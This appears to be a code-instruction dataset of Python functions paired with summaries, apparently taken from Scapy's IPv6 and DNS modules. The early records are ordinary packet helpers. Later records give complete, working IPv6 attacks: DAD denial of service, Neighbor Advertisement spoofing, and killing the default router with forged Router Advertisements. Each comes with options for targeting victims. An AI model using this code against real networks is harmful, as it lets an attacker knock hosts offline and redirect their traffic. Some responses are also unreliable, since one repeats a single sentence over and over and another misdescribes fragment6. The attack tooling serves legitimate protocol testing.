{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert the number of seconds since 1 - Jan - 70 UTC to the packed representation.", "response": "def h2i(self, pkt, seconds):\n        \"\"\"Convert the number of seconds since 1-Jan-70 UTC to the packed\n           representation.\"\"\"\n\n        if seconds is None:\n            seconds = 0\n\n        tmp_short = (seconds >> 32) & 0xFFFF\n        tmp_int = seconds & 0xFFFFFFFF\n\n        return struct.pack(\"!HI\", tmp_short, tmp_int)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconvert the internal representation to a nice one using the RFC format.", "response": "def i2repr(self, pkt, packed_seconds):\n        \"\"\"Convert the internal representation to a nice one using the RFC\n           format.\"\"\"\n        time_struct = time.gmtime(self._convert_seconds(packed_seconds))\n        return time.strftime(\"%a %b %d %H:%M:%S %Y\", time_struct)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning True if self is an answer from other.", "response": "def answers(self, other):\n        \"\"\"DEV: true if self is an answer from other\"\"\"\n        if other.__class__ == self.__class__:\n            return (other.service + 0x40) == self.service or \\\n                   (self.service == 0x7f and\n                    (self.requestServiceId == other.service))\n        return 0"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef neighsol(addr, src, iface, timeout=1, chainCC=0):\n\n    nsma = in6_getnsma(inet_pton(socket.AF_INET6, addr))\n    d = inet_ntop(socket.AF_INET6, nsma)\n    dm = in6_getnsmac(nsma)\n    p = Ether(dst=dm) / IPv6(dst=d, src=src, hlim=255)\n    p /= ICMPv6ND_NS(tgt=addr)\n    p /= ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(iface))\n    res = srp1(p, type=ETH_P_IPV6, iface=iface, timeout=1, verbose=0,\n               chainCC=chainCC)\n\n    return res", "response": "Sends and receive an ICMPv6 Neighbor Solicitation message to the specified IPv6 address."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef getmacbyip6(ip6, chainCC=0):\n\n    if isinstance(ip6, Net6):\n        ip6 = str(ip6)\n\n    if in6_ismaddr(ip6):  # Multicast\n        mac = in6_getnsmac(inet_pton(socket.AF_INET6, ip6))\n        return mac\n\n    iff, a, nh = conf.route6.route(ip6)\n\n    if iff == scapy.consts.LOOPBACK_INTERFACE:\n        return \"ff:ff:ff:ff:ff:ff\"\n\n    if nh != '::':\n        ip6 = nh  # Found next hop\n\n    mac = conf.netcache.in6_neighbor.get(ip6)\n    if mac:\n        return mac\n\n    res = neighsol(ip6, a, iff, chainCC=chainCC)\n\n    if res is not None:\n        if ICMPv6NDOptDstLLAddr in res:\n            mac = res[ICMPv6NDOptDstLLAddr].lladdr\n        else:\n            mac = res.src\n        conf.netcache.in6_neighbor[ip6] = mac\n        return mac\n\n    return None", "response": "Returns the MAC address corresponding to an IPv6 address."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef in6_chksum(nh, u, p):\n\n    ph6 = PseudoIPv6()\n    ph6.nh = nh\n    rthdr = 0\n    hahdr = 0\n    final_dest_addr_found = 0\n    while u is not None and not isinstance(u, IPv6):\n        if (isinstance(u, IPv6ExtHdrRouting) and\n            u.segleft != 0 and len(u.addresses) != 0 and\n                final_dest_addr_found == 0):\n            rthdr = u.addresses[-1]\n            final_dest_addr_found = 1\n        elif (isinstance(u, IPv6ExtHdrSegmentRouting) and\n              u.segleft != 0 and len(u.addresses) != 0 and\n              final_dest_addr_found == 0):\n            rthdr = u.addresses[0]\n            final_dest_addr_found = 1\n        elif (isinstance(u, IPv6ExtHdrDestOpt) and (len(u.options) == 1) and\n              isinstance(u.options[0], HAO)):\n            hahdr = u.options[0].hoa\n        u = u.underlayer\n    if u is None:\n        warning(\"No IPv6 underlayer to compute checksum. Leaving null.\")\n        return 0\n    if hahdr:\n        ph6.src = hahdr\n    else:\n        ph6.src = u.src\n    if rthdr:\n        ph6.dst = rthdr\n    else:\n        ph6.dst = u.dst\n    ph6.uplen = len(p)\n    ph6s = raw(ph6)\n    return checksum(ph6s + p)", "response": "This function calculates the checksum of an IPv6 message."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntaking a list of IPv6 packets and returns a list of IPv6 fragments.", "response": "def defragment6(packets):\n    \"\"\"\n    Performs defragmentation of a list of IPv6 packets. Packets are reordered.\n    Crap is dropped. What lacks is completed by 'X' characters.\n    \"\"\"\n\n    # Remove non fragments\n    lst = [x for x in packets if IPv6ExtHdrFragment in x]\n    if not lst:\n        return []\n\n    id = lst[0][IPv6ExtHdrFragment].id\n\n    llen = len(lst)\n    lst = [x for x in lst if x[IPv6ExtHdrFragment].id == id]\n    if len(lst) != llen:\n        warning(\"defragment6: some fragmented packets have been removed from list\")  # noqa: E501\n    llen = len(lst)\n\n    # reorder fragments\n    res = []\n    while lst:\n        min_pos = 0\n        min_offset = lst[0][IPv6ExtHdrFragment].offset\n        for p in lst:\n            cur_offset = p[IPv6ExtHdrFragment].offset\n            if cur_offset < min_offset:\n                min_pos = 0\n                min_offset = cur_offset\n        res.append(lst[min_pos])\n        del(lst[min_pos])\n\n    # regenerate the fragmentable part\n    fragmentable = b\"\"\n    for p in res:\n        q = p[IPv6ExtHdrFragment]\n        offset = 8 * q.offset\n        if offset != len(fragmentable):\n            warning(\"Expected an offset of %d. Found %d. Padding with XXXX\" % (len(fragmentable), offset))  # noqa: E501\n        fragmentable += b\"X\" * (offset - len(fragmentable))\n        fragmentable += raw(q.payload)\n\n    # Regenerate the unfragmentable part.\n    q = res[0]\n    nh = q[IPv6ExtHdrFragment].nh\n    q[IPv6ExtHdrFragment].underlayer.nh = nh\n    q[IPv6ExtHdrFragment].underlayer.plen = len(fragmentable)\n    del q[IPv6ExtHdrFragment].underlayer.payload\n    q /= conf.raw_layer(load=fragmentable)\n    del(q.plen)\n\n    return IPv6(raw(q))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fragment6(pkt, fragSize):\n\n    pkt = pkt.copy()\n\n    if IPv6ExtHdrFragment not in pkt:\n        # TODO : automatically add a fragment before upper Layer\n        #        at the moment, we do nothing and return initial packet\n        #        as single element of a list\n        return [pkt]\n\n    # If the payload is bigger than 65535, a Jumbo payload must be used, as\n    # an IPv6 packet can't be bigger than 65535 bytes.\n    if len(raw(pkt[IPv6ExtHdrFragment])) > 65535:\n        warning(\"An IPv6 packet can'be bigger than 65535, please use a Jumbo payload.\")  # noqa: E501\n        return []\n\n    s = raw(pkt)  # for instantiation to get upper layer checksum right\n\n    if len(s) <= fragSize:\n        return [pkt]\n\n    # Fragmentable part : fake IPv6 for Fragmentable part length computation\n    fragPart = pkt[IPv6ExtHdrFragment].payload\n    tmp = raw(IPv6(src=\"::1\", dst=\"::1\") / fragPart)\n    fragPartLen = len(tmp) - 40  # basic IPv6 header length\n    fragPartStr = s[-fragPartLen:]\n\n    # Grab Next Header for use in Fragment Header\n    nh = pkt[IPv6ExtHdrFragment].nh\n\n    # Keep fragment header\n    fragHeader = pkt[IPv6ExtHdrFragment]\n    del fragHeader.payload  # detach payload\n\n    # Unfragmentable Part\n    unfragPartLen = len(s) - fragPartLen - 8\n    unfragPart = pkt\n    del pkt[IPv6ExtHdrFragment].underlayer.payload  # detach payload\n\n    # Cut the fragmentable part to fit fragSize. Inner fragments have\n    # a length that is an integer multiple of 8 octets. last Frag MTU\n    # can be anything below MTU\n    lastFragSize = fragSize - unfragPartLen - 8\n    innerFragSize = lastFragSize - (lastFragSize % 8)\n\n    if lastFragSize <= 0 or innerFragSize == 0:\n        warning(\"Provided fragment size value is too low. \" +\n                \"Should be more than %d\" % (unfragPartLen + 8))\n        return [unfragPart / fragHeader / fragPart]\n\n    remain = fragPartStr\n    res = []\n    fragOffset = 0     # offset, incremeted during creation\n    fragId = random.randint(0, 0xffffffff)  # random id ...\n    if fragHeader.id is not None:  # ... except id provided by user\n        fragId = fragHeader.id\n    fragHeader.m = 1\n    fragHeader.id = fragId\n    fragHeader.nh = nh\n\n    # Main loop : cut, fit to FRAGSIZEs, fragOffset, Id ...\n    while True:\n        if (len(remain) > lastFragSize):\n            tmp = remain[:innerFragSize]\n            remain = remain[innerFragSize:]\n            fragHeader.offset = fragOffset    # update offset\n            fragOffset += (innerFragSize // 8)  # compute new one\n            if IPv6 in unfragPart:\n                unfragPart[IPv6].plen = None\n            tempo = unfragPart / fragHeader / conf.raw_layer(load=tmp)\n            res.append(tempo)\n        else:\n            fragHeader.offset = fragOffset    # update offSet\n            fragHeader.m = 0\n            if IPv6 in unfragPart:\n                unfragPart[IPv6].plen = None\n            tempo = unfragPart / fragHeader / conf.raw_layer(load=remain)\n            res.append(tempo)\n            break\n    return res", "response": "This function is used to create a new IPv6 fragment. It is used to create a new IPv6 packet with the specified fragment size."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting a list of DNS names or a single DNS name into a DNS name in DNS format.", "response": "def names2dnsrepr(x):\n    \"\"\"\n    Take as input a list of DNS names or a single DNS name\n    and encode it in DNS format (with possible compression)\n    If a string that is already a DNS name in DNS format\n    is passed, it is returned unmodified. Result is a string.\n    !!!  At the moment, compression is not implemented  !!!\n    \"\"\"\n\n    if isinstance(x, bytes):\n        if x and x[-1:] == b'\\x00':  # stupid heuristic\n            return x\n        x = [x]\n\n    res = []\n    for n in x:\n        termin = b\"\\x00\"\n        if n.count(b'.') == 0:  # single-component gets one more\n            termin += b'\\x00'\n        n = b\"\".join(chb(len(y)) + y for y in n.split(b'.')) + termin\n        res.append(n)\n    return b\"\".join(res)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef dnsrepr2names(x):\n    res = []\n    cur = b\"\"\n    while x:\n        tmp_len = orb(x[0])\n        x = x[1:]\n        if not tmp_len:\n            if cur and cur[-1:] == b'.':\n                cur = cur[:-1]\n            res.append(cur)\n            cur = b\"\"\n            if x and orb(x[0]) == 0:  # single component\n                x = x[1:]\n            continue\n        if tmp_len & 0xc0:  # XXX TODO : work on that -- arno\n            raise Exception(\"DNS message can't be compressed at this point!\")\n        cur += x[:tmp_len] + b\".\"\n        x = x[tmp_len:]\n    return res", "response": "Takes as input a DNS encoded string possibly compressed and returns a list of DNS names contained in it."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _NDP_Attack_DAD_DoS(reply_callback, iface=None, mac_src_filter=None,\n                        tgt_filter=None, reply_mac=None):\n    \"\"\"\n    Internal generic helper accepting a specific callback as first argument,\n    for NS or NA reply. See the two specific functions below.\n    \"\"\"\n\n    def is_request(req, mac_src_filter, tgt_filter):\n        \"\"\"\n        Check if packet req is a request\n        \"\"\"\n\n        # Those simple checks are based on Section 5.4.2 of RFC 4862\n        if not (Ether in req and IPv6 in req and ICMPv6ND_NS in req):\n            return 0\n\n        # Get and compare the MAC address\n        mac_src = req[Ether].src\n        if mac_src_filter and mac_src != mac_src_filter:\n            return 0\n\n        # Source must be the unspecified address\n        if req[IPv6].src != \"::\":\n            return 0\n\n        # Check destination is the link-local solicited-node multicast\n        # address associated with target address in received NS\n        tgt = inet_pton(socket.AF_INET6, req[ICMPv6ND_NS].tgt)\n        if tgt_filter and tgt != tgt_filter:\n            return 0\n        received_snma = inet_pton(socket.AF_INET6, req[IPv6].dst)\n        expected_snma = in6_getnsma(tgt)\n        if received_snma != expected_snma:\n            return 0\n\n        return 1\n\n    if not iface:\n        iface = conf.iface\n\n    # To prevent sniffing our own traffic\n    if not reply_mac:\n        reply_mac = get_if_hwaddr(iface)\n    sniff_filter = \"icmp6 and not ether src %s\" % reply_mac\n\n    sniff(store=0,\n          filter=sniff_filter,\n          lfilter=lambda x: is_request(x, mac_src_filter, tgt_filter),\n          prn=lambda x: reply_callback(x, reply_mac, iface),\n          iface=iface)", "response": "Internal function for DAD attack DAD doS."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nperform the DAD DoS attack using NS described in section 4.1.3 of RFC 3756. This is done by listening incoming NS messages sent from the unspecified address and sending a NS reply for the target address, leading the peer to believe that another node is also performing DAD for that address. By default, the fake NS sent to create the DoS uses: - as target address the target address found in received NS. - as IPv6 source address: the unspecified address (::). - as IPv6 destination address: the link-local solicited-node multicast address derived from the target address in received NS. - the mac address of the interface as source (or reply_mac, see below). - the multicast mac address derived from the solicited node multicast address used as IPv6 destination address. Following arguments can be used to change the behavior: iface: a specific interface (e.g. \"eth0\") of the system on which the DoS should be launched. If None is provided conf.iface is used. mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on. Only NS messages received from this source will trigger replies. This allows limiting the effects of the DoS to a single target by filtering on its mac address. The default value is None: the DoS is not limited to a specific mac address. tgt_filter: Same as previous but for a specific target IPv6 address for received NS. If the target address in the NS message (not the IPv6 destination address) matches that address, then a fake reply will be sent, i.e. the emitter will be a target of the DoS. reply_mac: allow specifying a specific source mac address for the reply, i.e. to prevent the use of the mac address of the interface.", "response": "def NDP_Attack_DAD_DoS_via_NS(iface=None, mac_src_filter=None, tgt_filter=None,\n                              reply_mac=None):\n    \"\"\"\n    Perform the DAD DoS attack using NS described in section 4.1.3 of RFC\n    3756. This is done by listening incoming NS messages sent from the\n    unspecified address and sending a NS reply for the target address,\n    leading the peer to believe that another node is also performing DAD\n    for that address.\n\n    By default, the fake NS sent to create the DoS uses:\n     - as target address the target address found in received NS.\n     - as IPv6 source address: the unspecified address (::).\n     - as IPv6 destination address: the link-local solicited-node multicast\n       address derived from the target address in received NS.\n     - the mac address of the interface as source (or reply_mac, see below).\n     - the multicast mac address derived from the solicited node multicast\n       address used as IPv6 destination address.\n\n    Following arguments can be used to change the behavior:\n\n    iface: a specific interface (e.g. \"eth0\") of the system on which the\n         DoS should be launched. If None is provided conf.iface is used.\n\n    mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on.\n         Only NS messages received from this source will trigger replies.\n         This allows limiting the effects of the DoS to a single target by\n         filtering on its mac address. The default value is None: the DoS\n         is not limited to a specific mac address.\n\n    tgt_filter: Same as previous but for a specific target IPv6 address for\n         received NS. If the target address in the NS message (not the IPv6\n         destination address) matches that address, then a fake reply will\n         be sent, i.e. the emitter will be a target of the DoS.\n\n    reply_mac: allow specifying a specific source mac address for the reply,\n         i.e. to prevent the use of the mac address of the interface.\n    \"\"\"\n\n    def ns_reply_callback(req, reply_mac, iface):\n        \"\"\"\n        Callback that reply to a NS by sending a similar NS\n        \"\"\"\n\n        # Let's build a reply and send it\n        mac = req[Ether].src\n        dst = req[IPv6].dst\n        tgt = req[ICMPv6ND_NS].tgt\n        rep = Ether(src=reply_mac) / IPv6(src=\"::\", dst=dst) / ICMPv6ND_NS(tgt=tgt)  # noqa: E501\n        sendp(rep, iface=iface, verbose=0)\n\n        print(\"Reply NS for target address %s (received from %s)\" % (tgt, mac))\n\n    _NDP_Attack_DAD_DoS(ns_reply_callback, iface, mac_src_filter,\n                        tgt_filter, reply_mac)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nperform the DAD DoS attack using NS described in section 4.1.3 of RFC 3756. This is done by listening incoming NS messages *sent from the unspecified address* and sending a NA reply for the target address, leading the peer to believe that another node is also performing DAD for that address. By default, the fake NA sent to create the DoS uses: - as target address the target address found in received NS. - as IPv6 source address: the target address found in received NS. - as IPv6 destination address: the link-local solicited-node multicast address derived from the target address in received NS. - the mac address of the interface as source (or reply_mac, see below). - the multicast mac address derived from the solicited node multicast address used as IPv6 destination address. - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr) filled with the mac address used as source of the NA. Following arguments can be used to change the behavior: iface: a specific interface (e.g. \"eth0\") of the system on which the DoS should be launched. If None is provided conf.iface is used. mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on. Only NS messages received from this source will trigger replies. This allows limiting the effects of the DoS to a single target by filtering on its mac address. The default value is None: the DoS is not limited to a specific mac address. tgt_filter: Same as previous but for a specific target IPv6 address for received NS. If the target address in the NS message (not the IPv6 destination address) matches that address, then a fake reply will be sent, i.e. the emitter will be a target of the DoS. reply_mac: allow specifying a specific source mac address for the reply, i.e. to prevent the use of the mac address of the interface. This address will also be used in the Target Link-Layer Address option.", "response": "def NDP_Attack_DAD_DoS_via_NA(iface=None, mac_src_filter=None, tgt_filter=None,\n                              reply_mac=None):\n    \"\"\"\n    Perform the DAD DoS attack using NS described in section 4.1.3 of RFC\n    3756. This is done by listening incoming NS messages *sent from the\n    unspecified address* and sending a NA reply for the target address,\n    leading the peer to believe that another node is also performing DAD\n    for that address.\n\n    By default, the fake NA sent to create the DoS uses:\n     - as target address the target address found in received NS.\n     - as IPv6 source address: the target address found in received NS.\n     - as IPv6 destination address: the link-local solicited-node multicast\n       address derived from the target address in received NS.\n     - the mac address of the interface as source (or reply_mac, see below).\n     - the multicast mac address derived from the solicited node multicast\n       address used as IPv6 destination address.\n     - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr) filled\n       with the mac address used as source of the NA.\n\n    Following arguments can be used to change the behavior:\n\n    iface: a specific interface (e.g. \"eth0\") of the system on which the\n          DoS should be launched. If None is provided conf.iface is used.\n\n    mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on.\n         Only NS messages received from this source will trigger replies.\n         This allows limiting the effects of the DoS to a single target by\n         filtering on its mac address. The default value is None: the DoS\n         is not limited to a specific mac address.\n\n    tgt_filter: Same as previous but for a specific target IPv6 address for\n         received NS. If the target address in the NS message (not the IPv6\n         destination address) matches that address, then a fake reply will\n         be sent, i.e. the emitter will be a target of the DoS.\n\n    reply_mac: allow specifying a specific source mac address for the reply,\n         i.e. to prevent the use of the mac address of the interface. This\n         address will also be used in the Target Link-Layer Address option.\n    \"\"\"\n\n    def na_reply_callback(req, reply_mac, iface):\n        \"\"\"\n        Callback that reply to a NS with a NA\n        \"\"\"\n\n        # Let's build a reply and send it\n        mac = req[Ether].src\n        dst = req[IPv6].dst\n        tgt = req[ICMPv6ND_NS].tgt\n        rep = Ether(src=reply_mac) / IPv6(src=tgt, dst=dst)\n        rep /= ICMPv6ND_NA(tgt=tgt, S=0, R=0, O=1)  # noqa: E741\n        rep /= ICMPv6NDOptDstLLAddr(lladdr=reply_mac)\n        sendp(rep, iface=iface, verbose=0)\n\n        print(\"Reply NA for target address %s (received from %s)\" % (tgt, mac))\n\n    _NDP_Attack_DAD_DoS(na_reply_callback, iface, mac_src_filter,\n                        tgt_filter, reply_mac)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef NDP_Attack_NA_Spoofing(iface=None, mac_src_filter=None, tgt_filter=None,\n                           reply_mac=None, router=False):\n    \"\"\"\n    The main purpose of this function is to send fake Neighbor Advertisement\n    messages to a victim. As the emission of unsolicited Neighbor Advertisement\n    is pretty pointless (from an attacker standpoint) because it will not\n    lead to a modification of a victim's neighbor cache, the function send\n    advertisements in response to received NS (NS sent as part of the DAD,\n    i.e. with an unspecified address as source, are not considered).\n\n    By default, the fake NA sent to create the DoS uses:\n     - as target address the target address found in received NS.\n     - as IPv6 source address: the target address\n     - as IPv6 destination address: the source IPv6 address of received NS\n       message.\n     - the mac address of the interface as source (or reply_mac, see below).\n     - the source mac address of the received NS as destination macs address\n       of the emitted NA.\n     - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr)\n       filled with the mac address used as source of the NA.\n\n    Following arguments can be used to change the behavior:\n\n    iface: a specific interface (e.g. \"eth0\") of the system on which the\n          DoS should be launched. If None is provided conf.iface is used.\n\n    mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on.\n         Only NS messages received from this source will trigger replies.\n         This allows limiting the effects of the DoS to a single target by\n         filtering on its mac address. The default value is None: the DoS\n         is not limited to a specific mac address.\n\n    tgt_filter: Same as previous but for a specific target IPv6 address for\n         received NS. If the target address in the NS message (not the IPv6\n         destination address) matches that address, then a fake reply will\n         be sent, i.e. the emitter will be a target of the DoS.\n\n    reply_mac: allow specifying a specific source mac address for the reply,\n         i.e. to prevent the use of the mac address of the interface. This\n         address will also be used in the Target Link-Layer Address option.\n\n    router: by the default (False) the 'R' flag in the NA used for the reply\n         is not set. If the parameter is set to True, the 'R' flag in the\n         NA is set, advertising us as a router.\n\n    Please, keep the following in mind when using the function: for obvious\n    reasons (kernel space vs. Python speed), when the target of the address\n    resolution is on the link, the sender of the NS receives 2 NA messages\n    in a row, the valid one and our fake one. The second one will overwrite\n    the information provided by the first one, i.e. the natural latency of\n    Scapy helps here.\n\n    In practice, on a common Ethernet link, the emission of the NA from the\n    genuine target (kernel stack) usually occurs in the same millisecond as\n    the receipt of the NS. The NA generated by Scapy6 will usually come after\n    something 20+ ms. On a usual testbed for instance, this difference is\n    sufficient to have the first data packet sent from the victim to the\n    destination before it even receives our fake NA.\n    \"\"\"\n\n    def is_request(req, mac_src_filter, tgt_filter):\n        \"\"\"\n        Check if packet req is a request\n        \"\"\"\n\n        # Those simple checks are based on Section 5.4.2 of RFC 4862\n        if not (Ether in req and IPv6 in req and ICMPv6ND_NS in req):\n            return 0\n\n        mac_src = req[Ether].src\n        if mac_src_filter and mac_src != mac_src_filter:\n            return 0\n\n        # Source must NOT be the unspecified address\n        if req[IPv6].src == \"::\":\n            return 0\n\n        tgt = inet_pton(socket.AF_INET6, req[ICMPv6ND_NS].tgt)\n        if tgt_filter and tgt != tgt_filter:\n            return 0\n\n        dst = req[IPv6].dst\n        if in6_isllsnmaddr(dst):  # Address is Link Layer Solicited Node mcast.\n\n            # If this is a real address resolution NS, then the destination\n            # address of the packet is the link-local solicited node multicast\n            # address associated with the target of the NS.\n            # Otherwise, the NS is a NUD related one, i.e. the peer is\n            # unicasting the NS to check the target is still alive (L2\n            # information is still in its cache and it is verified)\n            received_snma = inet_pton(socket.AF_INET6, dst)\n            expected_snma = in6_getnsma(tgt)\n            if received_snma != expected_snma:\n                print(\"solicited node multicast @ does not match target @!\")\n                return 0\n\n        return 1\n\n    def reply_callback(req, reply_mac, router, iface):\n        \"\"\"\n        Callback that reply to a NS with a spoofed NA\n        \"\"\"\n\n        # Let's build a reply (as defined in Section 7.2.4. of RFC 4861) and\n        # send it back.\n        mac = req[Ether].src\n        pkt = req[IPv6]\n        src = pkt.src\n        tgt = req[ICMPv6ND_NS].tgt\n        rep = Ether(src=reply_mac, dst=mac) / IPv6(src=tgt, dst=src)\n        # Use the target field from the NS\n        rep /= ICMPv6ND_NA(tgt=tgt, S=1, R=router, O=1)  # noqa: E741\n\n        # \"If the solicitation IP Destination Address is not a multicast\n        # address, the Target Link-Layer Address option MAY be omitted\"\n        # Given our purpose, we always include it.\n        rep /= ICMPv6NDOptDstLLAddr(lladdr=reply_mac)\n\n        sendp(rep, iface=iface, verbose=0)\n\n        print(\"Reply NA for target address %s (received from %s)\" % (tgt, mac))\n\n    if not iface:\n        iface = conf.iface\n    # To prevent sniffing our own traffic\n    if not reply_mac:\n        reply_mac = get_if_hwaddr(iface)\n    sniff_filter = \"icmp6 and not ether src %s\" % reply_mac\n\n    router = (router and 1) or 0  # Value of the R flags in NA\n\n    sniff(store=0,\n          filter=sniff_filter,\n          lfilter=lambda x: is_request(x, mac_src_filter, tgt_filter),\n          prn=lambda x: reply_callback(x, reply_mac, router, iface),\n          iface=iface)", "response": "This function is used to send fake NDP NAs to a victim. It is used to send fake NAs to a victim. It is used to send fake NAs to a victim. It is used to send fake NAs to a victim. It is used to send fake NAs to a victim. It is used to send fake NAs to a victim. It is used to send fake NAs to a victim. It is used to send fake NAs to a victim."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef NDP_Attack_Kill_Default_Router(iface=None, mac_src_filter=None,\n                                   ip_src_filter=None, reply_mac=None,\n                                   tgt_mac=None):\n    \"\"\"\n    The purpose of the function is to monitor incoming RA messages\n    sent by default routers (RA with a non-zero Router Lifetime values)\n    and invalidate them by immediately replying with fake RA messages\n    advertising a zero Router Lifetime value.\n\n    The result on receivers is that the router is immediately invalidated,\n    i.e. the associated entry is discarded from the default router list\n    and destination cache is updated to reflect the change.\n\n    By default, the function considers all RA messages with a non-zero\n    Router Lifetime value but provides configuration knobs to allow\n    filtering RA sent by specific routers (Ethernet source address).\n    With regard to emission, the multicast all-nodes address is used\n    by default but a specific target can be used, in order for the DoS to\n    apply only to a specific host.\n\n    More precisely, following arguments can be used to change the behavior:\n\n    iface: a specific interface (e.g. \"eth0\") of the system on which the\n         DoS should be launched. If None is provided conf.iface is used.\n\n    mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on.\n         Only RA messages received from this source will trigger replies.\n         If other default routers advertised their presence on the link,\n         their clients will not be impacted by the attack. The default\n         value is None: the DoS is not limited to a specific mac address.\n\n    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter\n         on. Only RA messages received from this source address will trigger\n         replies. If other default routers advertised their presence on the\n         link, their clients will not be impacted by the attack. The default\n         value is None: the DoS is not limited to a specific IPv6 source\n         address.\n\n    reply_mac: allow specifying a specific source mac address for the reply,\n         i.e. to prevent the use of the mac address of the interface.\n\n    tgt_mac: allow limiting the effect of the DoS to a specific host,\n         by sending the \"invalidating RA\" only to its mac address.\n    \"\"\"\n\n    def is_request(req, mac_src_filter, ip_src_filter):\n        \"\"\"\n        Check if packet req is a request\n        \"\"\"\n\n        if not (Ether in req and IPv6 in req and ICMPv6ND_RA in req):\n            return 0\n\n        mac_src = req[Ether].src\n        if mac_src_filter and mac_src != mac_src_filter:\n            return 0\n\n        ip_src = req[IPv6].src\n        if ip_src_filter and ip_src != ip_src_filter:\n            return 0\n\n        # Check if this is an advertisement for a Default Router\n        # by looking at Router Lifetime value\n        if req[ICMPv6ND_RA].routerlifetime == 0:\n            return 0\n\n        return 1\n\n    def ra_reply_callback(req, reply_mac, tgt_mac, iface):\n        \"\"\"\n        Callback that sends an RA with a 0 lifetime\n        \"\"\"\n\n        # Let's build a reply and send it\n\n        src = req[IPv6].src\n\n        # Prepare packets parameters\n        ether_params = {}\n        if reply_mac:\n            ether_params[\"src\"] = reply_mac\n\n        if tgt_mac:\n            ether_params[\"dst\"] = tgt_mac\n\n        # Basis of fake RA (high pref, zero lifetime)\n        rep = Ether(**ether_params) / IPv6(src=src, dst=\"ff02::1\")\n        rep /= ICMPv6ND_RA(prf=1, routerlifetime=0)\n\n        # Add it a PIO from the request ...\n        tmp = req\n        while ICMPv6NDOptPrefixInfo in tmp:\n            pio = tmp[ICMPv6NDOptPrefixInfo]\n            tmp = pio.payload\n            del(pio.payload)\n            rep /= pio\n\n        # ... and source link layer address option\n        if ICMPv6NDOptSrcLLAddr in req:\n            mac = req[ICMPv6NDOptSrcLLAddr].lladdr\n        else:\n            mac = req[Ether].src\n        rep /= ICMPv6NDOptSrcLLAddr(lladdr=mac)\n\n        sendp(rep, iface=iface, verbose=0)\n\n        print(\"Fake RA sent with source address %s\" % src)\n\n    if not iface:\n        iface = conf.iface\n    # To prevent sniffing our own traffic\n    if not reply_mac:\n        reply_mac = get_if_hwaddr(iface)\n    sniff_filter = \"icmp6 and not ether src %s\" % reply_mac\n\n    sniff(store=0,\n          filter=sniff_filter,\n          lfilter=lambda x: is_request(x, mac_src_filter, ip_src_filter),\n          prn=lambda x: ra_reply_callback(x, reply_mac, tgt_mac, iface),\n          iface=iface)", "response": "The purpose of the function is to monitor incoming RA messages\n    sent by default routers (RA with a non-zero Router Lifetime values)\n    and invalidate them by immediately replying with fake RA messages\n    advertising a zero Router Lifetime value.\n\n    The result on receivers is that the router is immediately invalidated,\n    i.e. the associated entry is discarded from the default router list\n    and destination cache is updated to reflect the change.\n\n    By default, the function considers all RA messages with a non-zero\n    Router Lifetime value but provides configuration knobs to allow\n    filtering RA sent by specific routers (Ethernet source address).\n    With regard to emission, the multicast all-nodes address is used\n    by default but a specific target can be used, in order for the DoS to\n    apply only to a specific host.\n\n    More precisely, following arguments can be used to change the behavior:\n\n    iface: a specific interface (e.g. \"eth0\") of the system on which the\n         DoS should be launched. If None is provided conf.iface is used.\n\n    mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on.\n         Only RA messages received from this source will trigger replies.\n         If other default routers advertised their presence on the link,\n         their clients will not be impacted by the attack. The default\n         value is None: the DoS is not limited to a specific mac address.\n\n    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter\n         on. Only RA messages received from this source address will trigger\n         replies. If other default routers advertised their presence on the\n         link, their clients will not be impacted by the attack. The default\n         value is None: the DoS is not limited to a specific IPv6 source\n         address.\n\n    reply_mac: allow specifying a specific source mac address for the reply,\n         i.e. to prevent the use of the mac address of the interface.\n\n    tgt_mac: allow limiting the effect of the DoS to a specific host,\n         by sending the \"invalidating RA\" only to its mac address."}
